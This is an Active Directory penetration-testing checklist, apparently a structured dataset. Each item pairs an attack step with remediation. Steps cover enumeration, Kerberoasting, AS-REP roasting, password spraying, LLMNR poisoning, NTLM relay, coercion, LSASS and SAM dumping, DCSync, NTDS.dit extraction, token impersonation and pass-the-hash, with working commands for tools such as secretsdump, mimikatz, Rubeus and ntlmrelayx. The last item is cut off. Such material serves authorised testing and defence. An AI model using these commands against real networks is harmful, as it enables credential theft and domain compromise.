items.title: Identify domain controllers and naming contexts
items.description: Locate all domain controllers via DNS SRV records (_ldap._tcp.dc._msdcs), LDAP rootDSE, and nltest.
items.how_to_find:
Locate DCs and read the directory naming contexts:

```
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
nxc ldap <dc-ip> -u <user> -p <pass> --query "(objectClass=domain)" ""
ldapsearch -x -H ldap://<dc-ip> -s base namingContexts
```
items.how_to_fix: Recon step (not a vuln). Defensively: minimize anonymous LDAP exposure, monitor for mass LDAP/SRV enumeration, and segment DCs. Ensure only authenticated, authorized enumeration is possible.

items.title: Enumerate users, groups, and computers
items.description: Pull the full directory of user accounts, security groups (especially privileged groups like Domain Admins, Enterprise Admins, and protected groups), and computer objects via authenticated or anonymous LDAP.
items.how_to_find:
Pull directory objects with valid creds:

```
nxc ldap <dc-ip> -u <user> -p <pass> --users --groups
nxc smb <dc-ip> -u <user> -p <pass> --users
# or BloodHound/ldapdomaindump for full detail
```
items.how_to_fix: Recon step. Defensively: restrict "Authenticated Users" read where feasible, remove legacy anonymous access, monitor bulk LDAP queries, and apply least privilege on sensitive OUs/attributes.

items.title: Retrieve domain password and lockout policy
items.description: Read the domain password policy and any fine-grained password policies (PSOs) to determine minimum length, complexity, lockout threshold, and observation window.
items.how_to_find:
Read the policy (needed before spraying):

```
nxc smb <dc-ip> -u <user> -p <pass> --pass-pol
```
items.how_to_fix: Recon step. Defensively: enforce a strong password policy (length/complexity/banned-password list via Azure AD Password Protection), sensible lockout thresholds, and fine-grained password policies for privileged accounts.

items.title: Discover SPNs and service accounts
items.description: Enumerate accounts with servicePrincipalName values set.
items.how_to_find:
List accounts with SPNs (Kerberoast targets):

```
nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting out.txt
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip>
```
items.how_to_fix: Recon step feeding Kerberoasting. Defensively: use gMSA/managed service accounts (128-char random passwords), remove unnecessary SPNs, and require strong passwords on any remaining SPN accounts. See Kerberoasting remediation.

items.title: Flag accounts with delegation and risky UAC attributes
items.description: Identify accounts trusted for unconstrained/constrained delegation, accounts with DONT_REQUIRE_PREAUTH (AS-REP roastable), disabled-but-present accounts, and accounts with adminCount=1 protected by AdminSDHolder.
items.how_to_find:
Find delegation + dangerous UAC flags (unconstrained delegation, DONT_REQ_PREAUTH, PASSWD_NOTREQD):

```
nxc ldap <dc-ip> -u <user> -p <pass> --trusted-for-delegation --password-not-required
Get-DomainComputer -Unconstrained | select name   # PowerView
```
items.how_to_fix: Remove unconstrained delegation (use constrained/RBCD with protocol restrictions), add sensitive accounts to Protected Users / mark "sensitive & cannot be delegated", clear `PASSWD_NOTREQD`, and enable pre-auth. Re-audit UAC flags.

items.title: Map domain and forest trusts
items.description: Enumerate inbound/outbound trusts, trust direction, transitivity, and trust type (parent-child, external, forest).
items.how_to_find:
Enumerate trusts and directions:

```
nxc ldap <dc-ip> -u <user> -p <pass> -M enum_trusts
nltest /domain_trusts /all_trusts
```
items.how_to_fix: Recon step. Defensively: enable SID filtering + selective authentication on trusts, remove unnecessary trusts, and treat forest (not domain) as the security boundary. Review trust direction/transitivity.

items.title: Run SharpHound/collector across the domain
items.description: Collect sessions, ACLs, group memberships, trusts, GPOs, and local admin data using SharpHound (Windows), the Python collector (bloodhound-python), or netexec BloodHound module.
items.how_to_find:
Collect graph data:

```
nxc ldap <dc-ip> -u <user> -p <pass> --bloodhound --collection All --dns-server <dc-ip>
# or: SharpHound.exe -c All ; bloodhound-python -d <domain> -u <user> -p <pass> -c All -ns <dc-ip>
```
items.how_to_fix: Recon step. Defensively: run BloodHound yourself to find and cut attack paths, tier admin accounts, monitor for mass LDAP/session enumeration, and reduce excessive rights the collector surfaces.

items.title: Find shortest paths to Domain Admins
items.description: Mark owned principals and run the built-in "Shortest Paths to Domain Admins from Owned Principals" query plus high-value target queries to identify the most direct escalation route.
items.how_to_find: In BloodHound, mark owned nodes and run "Shortest Paths to Domain Admins" / pre-built queries to see escalation routes.
items.how_to_fix: Break the identified paths: remove excessive ACLs, tier administration (separate admin accounts/workstations), reduce local-admin sprawl (LAPS), and add high-value targets to Protected Users. Re-run BloodHound to confirm paths are cut.

items.title: Analyze dangerous ACL edges
items.description: Review GenericAll, GenericWrite, WriteDACL, WriteOwner, AddMember, ForceChangePassword, and AddKeyCredentialLink edges to find abusable object control relationships that BloodHound surfaces as graph edges.
items.how_to_find: Inspect edges like `GenericAll`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddKeyCredentialLink` toward privileged objects in BloodHound.
items.how_to_fix: Remove/least-privilege the offending ACEs, restore protected-object ACLs (AdminSDHolder/SDProp), and monitor DACL changes on privileged objects. Re-collect to verify edges are gone.

items.title: Hunt with custom Cypher queries
items.description: Use custom Cypher queries to surface relationships the default queries miss: kerberoastable users with paths to DA, computers allowing unconstrained delegation, and principals with control over GPOs or OUs.
items.how_to_find:
Run custom Cypher for org-specific risks, e.g.:

```
MATCH p=(u:User {enabled:true})-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer) RETURN p LIMIT 25
```
items.how_to_fix: Use findings to remove risky rights and shrink attack surface. Defensively adopt continuous BloodHound/attack-path monitoring. Re-query after remediation.

items.title: Correlate session and local-admin data
items.description: Use session and local-admin collection to find where privileged users are logged on, enabling targeted credential theft.
items.how_to_find:
Cross-reference where privileged users have sessions vs where you have local admin (derivative-admin paths):

```
nxc smb <targets> -u <user> -p <pass> --loggedon-users
```
items.how_to_fix: Reduce local-admin sprawl (LAPS, unique per-host), restrict where privileged accounts log on (tiering, "Deny logon" GPOs), and enable Credential Guard so sessions can't be looted. Re-assess derivative paths.

references.title: MITRE ATT&CK - System Network Connections Discovery (T1049)

items.title: Enumerate accessible SMB shares
items.description: Spider available SMB shares across hosts with read/write permission mapping.
items.how_to_find:
List and spider shares:

```
nxc smb <targets> -u <user> -p <pass> --shares
nxc smb <targets> -u <user> -p <pass> -M spider_plus
```
items.how_to_fix: Apply least-privilege share + NTFS permissions, remove `Everyone`/`Authenticated Users` from sensitive shares, and audit access. Re-scan with a low-priv account.

items.title: Recover GPP cpassword credentials
items.description: Search SYSVOL Groups.xml and other Group Policy Preferences files for cpassword fields.
items.how_to_find:
Find the AES-encrypted (publicly-keyed) GPP passwords in SYSVOL:

```
nxc smb <dc-ip> -u <user> -p <pass> -M gpp_password
Get-GPPPassword    # or gpp-decrypt on found cpassword
```
items.how_to_fix: Remove all GPP files containing `cpassword` from SYSVOL, stop setting passwords via GPP (use LAPS), and rotate any exposed credentials. Re-scan SYSVOL to confirm none remain.

items.title: Mine SYSVOL/NETLOGON logon scripts
items.description: Read logon scripts, batch files, and PowerShell in SYSVOL/NETLOGON for hardcoded credentials, mapped-drive passwords, and references to internal hosts and service accounts.
items.how_to_find:
Search logon scripts for hardcoded creds/paths:

```
nxc smb <dc-ip> -u <user> -p <pass> --share SYSVOL -M spider_plus
grep -RniE 'net use|password|/user:' \\<dc>\SYSVOL
```
items.how_to_fix: Remove credentials from logon scripts, restrict SYSVOL write to admins only, and fetch secrets from a vault at runtime. Rotate exposed creds. Re-scan scripts.

items.title: Hunt for secrets in file shares
items.description: Search readable shares for files matching credential patterns (passwords, keys, config, unattend.xml, web.config, KeePass databases, .ps1, .vbs) and connection strings.
items.how_to_find:
Grep shares for passwords, keys, KeePass, config files:

```
nxc smb <targets> -u <user> -p <pass> -M spider_plus --pattern password key .kdbx web.config
```
items.how_to_fix: Apply least-privilege ACLs, move secrets to a vault, add DLP/secret scanning on shares, and rotate exposed values. Re-scan.

references.title: MITRE ATT&CK - Unsecured Credentials in Files (T1552.001)

items.title: Test for null/anonymous SMB and LDAP access
items.description: Attempt anonymous SMB session and anonymous LDAP binds to enumerate users, shares, and policy without credentials.
items.how_to_find:
Attempt unauthenticated access:

```
nxc smb <dc-ip> -u '' -p '' --shares
ldapsearch -x -H ldap://<dc-ip> -b "DC=corp,DC=local"   # anonymous bind
```
items.how_to_fix: Disable anonymous SMB/LDAP: set `RestrictAnonymous`/`RestrictAnonymousSAM=1`, disable anonymous LDAP binds, and remove null-session shares. Re-test anonymous access fails.

items.title: Enumerate object DACLs across the domain
items.description: Read the nTSecurityDescriptor of users, groups, computers, OUs, and GPOs to extract ACEs.
items.how_to_find:
Dump ACLs for analysis:

```
Get-DomainObjectAcl -ResolveGUIDs -Identity <target>   # PowerView
dacledit.py -action read -target <object> <domain>/<user>:<pass>
```
items.how_to_fix: Recon step. Defensively: baseline and monitor DACLs on privileged objects, remove excessive ACEs, and ensure SDProp/AdminSDHolder protects sensitive principals. Re-audit for drift.

items.title: Identify GenericAll/GenericWrite/WriteDACL grants
items.description: Find principals holding GenericAll, GenericWrite, WriteDACL, or WriteOwner over high-value objects.
items.how_to_find:
Find dangerous rights over privileged objects:

```
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner'}
```
items.how_to_fix: Remove excessive rights from non-admins, apply least privilege on OUs/objects, restore protected-object ACLs, and monitor changes. Re-verify with BloodHound.

references.title: SpecterOps - An ACE Up the Sleeve

items.title: Check for DCSync replication rights
items.description: Identify non-DC principals granted DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object.
items.how_to_find:
Find principals with `DS-Replication-Get-Changes(-All)` on the domain head:

```
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get-Changes'}
```

Non-DC/non-admin principals with these rights = critical.
items.how_to_fix: Remove replication rights from any principal that isn't a DC/authorized admin, monitor DACL changes on the domain object, and alert on DCSync (event 4662 with the replication GUIDs). Re-audit.

items.title: Enumerate LAPS read permissions
items.description: Find principals able to read ms-Mcs-AdmPwd (legacy LAPS) or the encrypted LAPS attributes.
items.how_to_find:
Find who can read LAPS passwords (`ms-Mcs-AdmPwd` / `msLAPS-Password`):

```
nxc ldap <dc-ip> -u <user> -p <pass> -M laps
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd'}
```
items.how_to_fix: Restrict LAPS read to authorized admins only, tier access, audit reads, and ensure computers can't read their own attribute. Re-audit LAPS ACLs.

items.title: Find AddKeyCredentialLink (Shadow Credentials) rights
items.description: Identify principals with write access to the msDS-KeyCredentialLink attribute of target objects.
items.how_to_find:
Find who can write `msDS-KeyCredentialLink` on targets:

```
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'Key-Credential-Link|AddKeyCredentialLink'}
# BloodHound edge: AddKeyCredentialLink
```
items.how_to_fix: Remove write access to `msDS-KeyCredentialLink` from non-admins, protect privileged objects, and monitor writes to this attribute. Re-audit.

items.title: Request TGS tickets for SPN accounts
items.description: Enumerate user accounts with SPNs and request TGS-REP tickets for each.
items.how_to_find:
Request service tickets for all SPN accounts:

```
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile kerb.txt
nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting kerb.txt
```
items.how_to_fix: Use gMSA (auto-managed 128-char passwords) for service accounts, remove unnecessary SPNs, enforce long (25+ char) passwords on remaining SPN accounts, and prefer AES over RC4. Monitor 4769 for mass TGS requests. Re-test cracking fails.

items.title: Force RC4 (etype 23) downgrade where possible
items.description: Where supported, request tickets with RC4 encryption to obtain faster-cracking hashes.
items.how_to_find:
Request RC4 tickets (faster to crack) where allowed:

```
Rubeus.exe kerberoast /rc4opsec /outfile:kerb.txt
```
items.how_to_fix: Disable RC4 for Kerberos (enforce AES via `msDS-SupportedEncryptionTypes`), monitor for RC4 ticket requests, and use gMSA. Re-verify RC4 is refused.

items.title: Crack TGS hashes offline
items.description: Run the extracted krb5tgs hashes against wordlists and rules with hashcat/john.
items.how_to_find:
Crack the roasted hashes:

```
hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule
```
items.how_to_fix: Enforce long random service-account passwords / gMSA so offline cracking is infeasible, and rotate any cracked account. Re-attempt cracking to confirm resistance.

items.title: Targeted Kerberoasting via writable servicePrincipalName
items.description: If you hold write access to a target user, set a temporary SPN on the account, Kerberoast it, then remove the SPN.
items.how_to_find:
If you can write `servicePrincipalName` on a target, set an SPN then roast it:

```
Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='HTTP/x'}
GetUserSPNs.py ... -request-user <victim>
# then remove the SPN
```
items.how_to_fix: Remove write access to `servicePrincipalName` on user objects from non-admins, and apply the general Kerberoast controls (gMSA, strong passwords, AES). Re-audit write ACLs.

items.title: Validate and reuse cracked service credentials
items.description: Spray cracked service account passwords across hosts and services, and check group memberships.
items.how_to_find:
Verify cracked creds and map their access:

```
nxc smb <targets> -u <svc> -p <cracked> --shares
```
items.how_to_fix: Rotate cracked service-account passwords immediately (or migrate to gMSA), review the account's privileges (often over-privileged), and apply least privilege. Re-test the old password fails.

items.title: Enumerate accounts without Kerberos pre-auth
items.description: Find users with the DONT_REQ_PREAUTH UAC flag set.
items.how_to_find:
Find `DONT_REQ_PREAUTH` accounts:

```
nxc ldap <dc-ip> -u <user> -p <pass> --asreproast asrep.txt
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass
```
items.how_to_fix: Enable Kerberos pre-authentication on all accounts (clear `DONT_REQ_PREAUTH`), and enforce strong passwords. Re-audit for accounts without pre-auth.

items.title: Request AS-REP hashes
items.description: For each preauth-disabled account, request the AS-REP and capture the krb5asrep hash.
items.how_to_find:
Request the crackable AS-REP for pre-auth-disabled accounts:

```
GetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -outputfile asrep.txt
```
items.how_to_fix: Enable pre-auth on the affected accounts and enforce strong passwords. Monitor for AS-REQ without pre-auth. Re-verify AS-REP roasting fails.

items.title: Spray AS-REP roast against a username list unauthenticated
items.description: Without credentials, supply a username wordlist and query the KDC for AS-REP roastable accounts.
items.how_to_find:
No creds needed — try a username list:

```
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat
```
items.how_to_fix: Enable pre-auth domain-wide, enforce strong passwords, and monitor for enumeration/AS-REP requests. Re-test with the username list.

items.title: Crack AS-REP hashes offline
items.description: Crack the krb5asrep hashes with hashcat (mode 18200) or john using wordlists and rules.
items.how_to_find:
Crack:

```
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
```
items.how_to_fix: Enforce long passwords so cracking is infeasible and enable pre-auth to remove the primitive entirely. Rotate any cracked account. Re-attempt cracking.

items.title: Targeted AS-REP roast via writable userAccountControl
items.description: If you can write a target user UAC, set DONT_REQ_PREAUTH, AS-REP roast the account, then revert the flag.
items.how_to_find:
If you can write `userAccountControl` on a target, toggle DONT_REQ_PREAUTH then roast:

```
Set-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304}
GetNPUsers.py ... -request-user <victim>
```
items.how_to_fix: Remove write access to `userAccountControl` on user objects from non-admins, monitor UAC changes, and enable pre-auth. Re-audit write ACLs.

items.title: Confirm lockout policy before spraying
items.description: Read the domain and any fine-grained lockout policy first.
items.how_to_find:
Read lockout threshold/window first to avoid locking accounts:

```
nxc smb <dc-ip> -u <user> -p <pass> --pass-pol
```

Keep attempts safely below the threshold with delays between rounds.
items.how_to_fix: Defensively: set sane lockout thresholds + observation windows, enable Azure AD Smart Lockout / extranet lockout on ADFS, and alert on spray patterns (one password, many accounts). This is a safety + defense control.

items.title: Build a valid username list
items.description: Generate and validate usernames via LDAP enumeration, kerbrute user enumeration, or OSINT-derived naming conventions.
items.how_to_find:
Enumerate/validate usernames:

```
nxc smb <dc-ip> -u <user> -p <pass> --users
kerbrute userenum -d <domain> --dc <dc-ip> users.txt
```
items.how_to_fix: Recon step. Defensively: reduce username enumeration exposure (consistent responses on OWA/ADFS/Kerberos), avoid predictable naming for privileged accounts, and monitor enumeration.

items.title: Execute lockout-aware spray
items.description: Spray one candidate password per round across all users (seasonal passwords, Company123, Welcome1, etc.), then wait out the observation window before the next round.
items.how_to_find:
Spray one password across accounts, respecting lockout:

```
kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Season2024!'
nxc smb <dc-ip> -u users.txt -p 'Season2024!' --continue-on-success
```
items.how_to_fix: Enforce strong/banned-password policies + MFA, Smart Lockout, and alert on distributed spray. Rotate any hit. Re-test that weak seasonal passwords fail.

items.title: Validate hits and map privileges
items.description: Confirm each valid credential against SMB/LDAP/WinRM, check for password reuse across accounts, and map the access each credential grants for the next phase.
items.how_to_find:
For each hit, check access and group membership:

```
nxc smb <targets> -u <hit> -p <pass> --shares
nxc ldap <dc-ip> -u <hit> -p <pass> --groups
```
items.how_to_fix: Rotate compromised passwords, enforce MFA, apply least privilege (many sprayed hits are over-privileged), and review admin membership. Re-test the old password fails.

items.title: Spray external services (OWA/ADFS/VPN)
items.description: Where in scope, spray internet-facing authentication endpoints (Outlook Web Access, ADFS, VPN, O365) which often share AD credentials and may have weaker lockout monitoring.
items.how_to_find:
Spray internet-facing auth portals (authorized):

```
# tools like MailSniper/o365spray/fireprox-fronted spraying against OWA/ADFS/VPN
```
items.how_to_fix: Require MFA on all external services, enable extranet Smart Lockout, restrict access by geo/conditional access, and monitor for spray. Re-test external spray is blocked by MFA.

items.title: Poison LLMNR/NBT-NS/mDNS to capture NetNTLM
items.description: Run Responder to answer broadcast name-resolution queries.
items.how_to_find:
Respond to broadcast name resolution to capture hashes:

```
responder -I <iface> -wv
```

Captured NetNTLMv2 = high finding.
items.how_to_fix: Disable LLMNR (GPO: Turn off multicast name resolution), disable NBT-NS on adapters (DHCP option/script), disable mDNS where unused, and ensure DNS is correct. Re-run Responder to confirm no captures.

items.title: Crack captured NetNTLMv2 hashes
items.description: Crack captured NetNTLMv2 hashes offline with hashcat (mode 5600) and rules.
items.how_to_find:
Crack offline:

```
hashcat -m 5600 netntlm.txt rockyou.txt -r best64.rule
```
items.how_to_fix: Enforce strong passwords so cracking fails, and remove the capture source (disable LLMNR/NBT-NS). Rotate cracked accounts. Prefer relaying mitigations (signing) too. Re-attempt cracking.

items.title: Relay captured authentication instead of cracking
items.description: When SMB signing is not enforced, relay the coerced NetNTLM authentication to other hosts with ntlmrelayx instead of cracking it, executing commands or dumping SAM as the authenticating user.
items.how_to_find:
Relay instead of crack (no password needed):

```
# Responder off for SMB/HTTP, then:
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```

Successful relay = critical.
items.how_to_fix: Require SMB signing (and LDAP signing + channel binding), enable EPA on web/ADCS, disable NTLM where possible, and kill the capture source (LLMNR/NBT-NS). Re-test relay fails.

items.title: Inventory hosts without SMB signing
items.description: Scan the network for hosts where SMB signing is not required.
items.how_to_find:
Find relay targets (signing not required):

```
nxc smb <range> --gen-relay-list relay.txt
```
items.how_to_fix: Require SMB signing via GPO on all servers and clients, prioritizing DCs and high-value hosts. Re-scan to confirm signing is required everywhere.

items.title: Coerce authentication via RPC/printer triggers
items.description: Actively coerce machine-account authentication using PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), or DFSCoerce to drive relayable authentications from privileged hosts on demand.
items.how_to_find:
Force a target (e.g. a DC) to authenticate to you:

```
coercer coerce -u <user> -p <pass> -t <dc-ip> -l <listener-ip>
# PetitPotam / PrinterBug / DFSCoerce
```

Coerced DC auth relayed to ADCS/LDAP = critical.
items.how_to_fix: Patch coercion vectors (PetitPotam/PrintNightmare updates), disable the Print Spooler on DCs, require SMB/LDAP signing + EPA, and block relay paths (esp. to ADCS ESC8). Re-test coercion + relay fails.

sections.title: Credential Access — LSASS Dumping & Credential Extraction

items.title: Dump LSASS process memory
items.description: Create a memory dump of lsass.exe via comsvcs.dll MiniDump, Task Manager, procdump, or a custom dumper.
items.how_to_find:
Dump LSASS (authorized, on a compromised host):

```
nxc smb <ip> -u <user> -p <pass> -M lsassy
# or comsvcs MiniDump / procdump -ma lsass.exe
```
items.how_to_fix: Enable Credential Guard + LSA protection (RunAsPPL), deploy EDR to block LSASS access, restrict local admin, and use tiered admin so high-value creds never land on low-tier hosts. Re-test dumping is blocked.

items.title: Parse dump for secrets with Mimikatz/pypykatz
items.description: Parse the LSASS dump offline with pypykatz or Mimikatz sekurlsa to extract NT hashes, plaintext passwords (where WDigest/credentials cached), Kerberos tickets, and DPAPI master keys.
items.how_to_find:
Extract creds from the dump:

```
pypykatz lsa minidump lsass.dmp
# or mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords
```
items.how_to_fix: Same as LSASS protection: Credential Guard, RunAsPPL, EDR, tiering, and disable WDigest (`UseLogonCredential=0`) so plaintext isn't present. Rotate exposed creds. Re-verify.

items.title: Dump SAM and LSA secrets
items.description: Extract local SAM hashes and LSA secrets (cached domain credentials, service account passwords, DPAPI keys) from the registry hives, providing local admin hashes and additional domain credentials.
items.how_to_find:
Dump local SAM + LSA secrets (local accounts, service creds, cached):

```
nxc smb <ip> -u <user> -p <pass> --sam --lsa
secretsdump.py <domain>/<user>:<pass>@<ip>
```
items.how_to_fix: Use LAPS (unique local admin passwords), limit cached logons (`CachedLogonsCount`), protect service-account creds (gMSA), and enable Credential Guard. Rotate exposed secrets. Re-test.

references.title: The Hacker Recipes - SAM & LSA secrets

items.title: Decrypt DPAPI-protected secrets
items.description: Use recovered DPAPI master keys to decrypt saved browser passwords, RDP credentials, Wi-Fi keys, and the credential vault, expanding the credential set far beyond what LSASS held directly.
items.how_to_find:
Loot DPAPI-protected browser/creds vault secrets:

```
secretsdump.py -dpapi ...   # or mimikatz dpapi:: / SharpDPAPI
```
items.how_to_fix: Limit local admin (needed to reach masterkeys), enable Credential Guard, protect the domain DPAPI backup key on DCs, and use EDR. Rotate exposed secrets. Re-verify.

items.title: Harvest Kerberos tickets from memory
items.description: Export TGTs and TGS tickets from LSASS for Pass-the-Ticket reuse.
items.how_to_find:
Extract TGT/TGS for pass-the-ticket:

```
Rubeus.exe dump /nowrap
# or mimikatz sekurlsa::tickets /export
```
items.how_to_fix: Enable Credential Guard (protects tickets), restrict where privileged accounts log on (tiering), add them to Protected Users, and shorten ticket lifetimes. Re-test ticket harvesting is blocked.

references.title: The Hacker Recipes - Pass the ticket

items.title: Confirm replication rights
items.description: Verify the current principal holds DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object.
items.how_to_find:
Check which principals hold `Get-Changes`/`Get-Changes-All`:

```
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get-Changes'}
```
items.how_to_fix: Remove replication rights from any non-DC/non-admin principal, monitor DACL changes on the domain object, and alert on DCSync (event 4662 with the replication GUIDs). Re-audit.

items.title: DCSync the krbtgt account
items.description: Replicate the krbtgt account hash, which is the signing key for all Kerberos TGTs.
items.how_to_find:
Replicate the krbtgt hash (enables Golden Tickets):

```
secretsdump.py -just-dc-user krbtgt <domain>/<user>:<pass>@<dc-ip>
# or mimikatz lsadump::dcsync /user:krbtgt
```
items.how_to_fix: Restrict replication rights to DCs/authorized admins, monitor 4662 for replication GUIDs from non-DCs, and if krbtgt is exposed rotate it twice. Re-verify only DCs can DCSync.

items.title: DCSync specific high-value accounts
items.description: Replicate the credentials of targeted accounts (Domain Admins, service accounts) rather than the full domain to reduce noise while still obtaining the hashes you need.
items.how_to_find:
Pull specific accounts (e.g. a Domain Admin):

```
secretsdump.py -just-dc-user <target> <domain>/<user>:<pass>@<dc-ip>
```
items.how_to_fix: Remove excessive replication rights, tier admins, add high-value accounts to Protected Users, rotate exposed hashes, and alert on DCSync. Re-audit.

items.title: DCSync the entire domain credential set
items.description: When full compromise is authorized, replicate every account hash from the DC for password reuse analysis and complete credential mapping across the domain.
items.how_to_find:
Dump all domain hashes via replication:

```
secretsdump.py -just-dc <domain>/<user>:<pass>@<dc-ip>
```
items.how_to_fix: This implies full domain compromise: restrict replication rights, investigate how the rights were obtained, force a domain-wide password reset (incl. krbtgt x2), and monitor DCSync. Re-audit replication ACLs.

items.title: Abuse delegated replication grants from low privilege
items.description: If a non-DA principal you control was granted replication rights (often via a misconfigured ACL or after WriteDACL abuse), perform DCSync from that account to escalate without ever holding DA directly.
items.how_to_find:
If a low-priv principal was granted replication (misconfig/ACL abuse), use it directly:

```
secretsdump.py -just-dc <domain>/<lowpriv>:<pass>@<dc-ip>
```
items.how_to_fix: Remove replication rights from low-priv principals, audit how they were granted (WriteDacl chains), restore the domain object DACL, and alert on 4662. Re-verify.

references.title: SpecterOps - An ACE Up the Sleeve

items.title: Copy NTDS.dit via Volume Shadow Copy
items.description: Since NTDS.dit is locked while in use, create a Volume Shadow Copy (vssadmin/diskshadow/wmic) and copy the database plus the SYSTEM hive from the snapshot for offline parsing.
items.how_to_find:
On a DC, snapshot and copy the database + SYSTEM hive:

```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\...\Windows\NTDS\ntds.dit C:\temp\
reg save HKLM\SYSTEM C:\temp\SYSTEM
```
items.how_to_fix: DC compromise: restrict Domain Admin / DC logon (tiering), enable Credential Guard, monitor VSS usage on DCs, and protect backups. If exposed, reset all credentials (krbtgt x2). Investigate the initial access.

items.title: Extract hashes remotely with secretsdump
items.description: Use impacket secretsdump with DA credentials to remotely dump NTDS over DRSUAPI (effectively DCSync) or via VSS, avoiding manual file copying.
items.how_to_find:
Remotely dump domain hashes (DRSUAPI or VSS):

```
secretsdump.py <domain>/<da-user>:<pass>@<dc-ip>
```
items.how_to_fix: Restrict who holds DC-admin/replication rights, monitor DCSync/VSS, enable Credential Guard, and rotate exposed hashes. Re-audit privileged access.

items.title: Parse NTDS.dit offline
items.description: Parse the copied NTDS.dit and SYSTEM hive offline with secretsdump or DSInternals to extract NT hashes, password history, and Kerberos keys without further DC interaction.
items.how_to_find:
Parse the copied database offline:

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
items.how_to_fix: Protect NTDS.dit/backups (encryption, restricted access), tier DC administration, and rotate credentials if exposed. Re-verify backup access controls.

items.title: Extract and analyze password history
items.description: Dump historical password hashes from NTDS to identify password rotation patterns and predictable schemes, which can reveal current passwords or reuse across accounts.
items.how_to_find:
Dump history to assess password reuse/patterns:

```
secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL
```
items.how_to_fix: Enforce password history + banned-password lists (Azure AD Password Protection), discourage predictable rotations, and rotate reused credentials. Re-assess after policy change.

items.title: Crack and analyze domain hashes
items.description: Crack the recovered NTDS hashes offline and produce password reuse and weakness statistics.
items.how_to_find:
Crack NT hashes and analyze weak/shared passwords:

```
hashcat -m 1000 nt-hashes.txt rockyou.txt -r best64.rule
# then pass the pot to DPAT for stats
```
items.how_to_fix: Enforce strong/banned passwords + length, deploy fine-grained policies for admins, rotate cracked/reused accounts, and consider MFA. Re-crack to measure improvement.

items.title: Enumerate available tokens and privileges
items.description: List logged-on users and their tokens, and check the current token privileges (notably SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege) that enable impersonation or escalation.
items.how_to_find:
List tokens/privileges on a compromised host:

```
# mimikatz: token::list
whoami /priv    # look for SeImpersonate/SeAssignPrimaryToken/SeDebug
```
items.how_to_fix: Apply least privilege (remove SeImpersonate/SeDebug from service accounts where not required), tier admin logons, and deploy EDR. Re-audit assigned privileges.

items.title: Steal and impersonate a delegation token
items.description: Impersonate the token of a more privileged logged-on user (e.g., a Domain Admin with a session on the host) to execute commands in their context without their password.
items.how_to_find:
Impersonate a more-privileged user's token present on the host:

```
# mimikatz: token::elevate  (or Incognito: list_tokens / impersonate_token)
```
items.how_to_fix: Prevent privileged accounts from logging onto lower-tier hosts (tiering, Deny-logon GPOs), enable Credential Guard, and use RestrictedAdmin RDP. Re-assess where privileged tokens land.

items.title: Escalate via Potato attacks (SeImpersonate)
items.description: On a service account with SeImpersonatePrivilege, use a Potato attack (RoguePotato, JuicyPotato, PrintSpoofer, GodPotato) to coerce SYSTEM authentication and impersonate the SYSTEM token for local privilege escalation.
items.how_to_find:
With `SeImpersonate` (common on service accounts), escalate to SYSTEM:

```
# JuicyPotatoNG / PrintSpoofer / GodPotato
PrintSpoofer.exe -i -c cmd
```
items.how_to_fix: Remove `SeImpersonate`/`SeAssignPrimaryToken` from accounts that don't need it, patch the host, deploy EDR, and least-privilege service accounts. Re-test the potato fails.

items.title: Create logon tokens from known credentials
items.description: Use make_token / runas with captured credentials to spawn a process with an alternate logon token, enabling network authentication as another user without an interactive logon.
items.how_to_find:
Create a token/session from known creds for lateral use:

```
runas /netonly /user:<domain>\<user> cmd
# or mimikatz sekurlsa::pth for hash-based
```
items.how_to_fix: Rotate exposed creds, enforce MFA, and restrict privileged-account usage to hardened admin workstations. Re-test the old creds fail.

references.title: MITRE ATT&CK - Create Process with Token (T1134.002)

items.title: Revert impersonation and manage artifacts
items.description: Revert to self after impersonation and ensure no orphaned tokens, scheduled tasks, or credential artifacts remain, keeping the engagement clean and avoiding detection from leftover sessions.
items.how_to_find:
Revert to self and record artifacts created during testing:

```
# mimikatz: token::revert
```
items.how_to_fix: Process step: revert impersonation, log all created tokens/sessions/accounts, and remove artifacts after testing. Provides a clean, auditable engagement.

items.title: Validate NT hashes across hosts
items.description: Spray a recovered NT hash across the network to identify where it grants local admin or access.
items.how_to_find:
Test where an NT hash grants access:

```
nxc smb <range> -u <user> -H <nthash> --continue-on-success
```

`Pwn3d!` on multiple hosts = high (hash reuse).
items.how_to_fix: Deploy LAPS (unique local admin passwords), restrict local admin, enable Credential Guard, use Protected Users + tiering, and require SMB signing. Rotate exposed hashes. Re-test PtH fails.

references.title: The Hacker Recipes - Pass the hash

items.title: Execute commands via PtH
items.description: Use the hash with psexec/wmiexec/smbexec-style impacket tools or netexec to execute commands on hosts where it grants admin, without ever recovering plaintext.
items.how_to_find:
